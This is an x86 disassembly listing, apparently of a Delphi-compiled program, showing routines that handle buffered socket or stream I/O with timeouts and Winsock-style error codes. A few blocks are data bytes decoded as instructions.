mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_420ef8
mov eax [ r-xdata ]
call sub_46f3a4
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_46e9fc
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_46ecfc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_46ecfc
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_420f28
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404210
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f360
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4724b8
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_4724dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4726ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4728b4
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_403fe8
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4728b4
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_403fe8
mov eax [ ebp - 0x4 ]
call sub_4728b4
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_46d0a0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_4700a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46f83c
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_470ac4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_46fdf8
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_403fa4
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_46ff84
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_46d54c
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46f83c
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_46ff18
mov eax [ r-xdata ]
call sub_46f3a4
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf54
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_472368
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_472368
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4728b4
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_471d74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4726b4
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
sub_4726d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_472710
push ebx
mov ebx eax
mov eax ebx
call sub_470afc
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_47038c
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47015c
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_47274c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4727bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_46fed0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4727c3
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4727cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47283c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_46fef4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472843
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_47284c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4728b4
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_42109c
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4728b4
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d130
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_4728b4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_471524
mov [ ebx + 0x70 ] eax
sub_4728dc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_470acc
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
lea eax [ esi + 0x70 ]
call sub_40d130
sub_472920
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_472948
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403748#2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cf60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420f20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4729b0
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_403fa4
call sub_403984
mov eax [ ebp - 0x4 ]
call sub_420f20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4729d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4729f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472a00
retn
sub_472f61
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
cmovne ecx [ ecx + 0x64 ]
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
int3
pop edi
xor [ edi ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473075
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_473058
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f50
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_473224
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_404218
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47305f
sub_472f84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_473084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_473148
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47314f
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_46f830
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_473158
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_473180
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_474120
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4745b4
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_473224
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f50
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_473264
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d130
lea eax [ esi + 0xa4 ]
call sub_40d130
lea eax [ esi + 0x80 ]
call sub_40d130
lea eax [ esi + 0x6c ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f7b0
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d130
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4732c8
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_46f830
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_46f830
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d130
mov [ ebx + 0x70 ] 0x0
sub_473320
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_47432c
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_473348
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473399
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4733a0
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4733a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4733fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b7a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473405
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_47340c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
push 0x1
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x6c ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x48 ]
mov eax [ ebx + 0x74 ]
call sub_474698
mov edx edi
mov ecx esi
call sub_4028d8
mov edx esi
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_473478
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_473710
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473717
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_41ab48
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46cf60
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_41ab48
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41aae4
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_41ad28
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d014
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_473724
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_473942
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_474698
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46ed28
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404210
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404210
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_40459c
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_403f50
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473949
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_40459c
jmp r-xdata
sub_473960
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4739d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f50
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_404210
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4739dd
lea eax [ ebp - 0xc ]
call sub_403f50
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_407f4c
sub_4739e7
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5a178bbd ]
or eax [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
